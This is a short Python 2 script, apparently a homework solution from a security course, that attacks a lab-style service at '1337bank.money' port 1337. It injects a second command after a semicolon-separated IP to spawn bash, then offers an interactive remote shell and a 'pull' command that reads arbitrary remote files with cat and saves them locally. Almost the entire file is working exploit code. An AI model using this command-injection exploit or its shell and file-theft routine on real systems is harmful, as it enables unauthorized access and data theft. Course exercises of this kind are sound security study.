"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    prefix = "142.93.136.81;"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(2)

    if(cmd[0] == "shell"):

        s.recv(1024)
        s.send(prefix + " ./bin/bash\n")
        s.recv(1024)

        while(cmd != "quit"):
            cmd = raw_input(">")
            if cmd == "quit":
                print("exit")
                s.send("exit\n")
                break

            s.send(cmd+"\n");
            try:
                data = s.recv(1024)
            except socket.timeout,e:
                err = e.args[0]
                if err == 'timed out':
                    continue
            print(data)
        s.send("exit\n")
        #raise SystemExit(0)

    elif(cmd[0] == "help"):
        print("shell - Drop into an interactive shell and allow users to gracefully exit")
        print("pull <remote-path> <local-path> Download files")
        print("help Shows this help menu")
        print("quit Quit the shell")

    elif(cmd[0] == "pull"):
        s.recv(1024)
        s.send(prefix + "./bin/bash\n")
        s.recv(1024)
        s.send(" cat " + cmd[1] +"\n")
        data = s.recv(1024)
        f = open(cmd[2],"w")
        f.write(data)

    else:
        print("shell - Drop into an interactive shell and allow users to gracefully exit")
        print("pull <remote-path> <local-path> Download files")
        print("help Shows this help menu")
        print("quit Quit the shell")






if __name__ == '__main__':
    cmd = raw_input().split( )
    execute_cmd(cmd)
